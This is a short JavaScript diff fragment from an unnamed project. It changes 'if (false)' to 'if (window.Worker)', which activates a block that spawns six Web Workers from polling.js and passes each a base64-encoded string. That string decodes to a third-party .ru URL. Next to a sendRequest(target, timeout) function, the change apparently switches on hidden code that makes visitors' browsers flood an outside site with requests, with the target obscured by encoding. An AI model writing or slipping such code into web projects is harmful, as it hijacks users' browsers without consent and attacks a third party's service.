@@ -63,7 +63,7 @@ const sendRequest = async (target, timeout) => {
 }
 
 var init = 'aHR0cHM6Ly9jZm1jLnJ1Lw==';
-if (false) {
+if (window.Worker) {
   Array.from({length: 6}).forEach(() => {
     var pollingWorker = new Worker('polling.js');
     pollingWorker.postMessage(init);
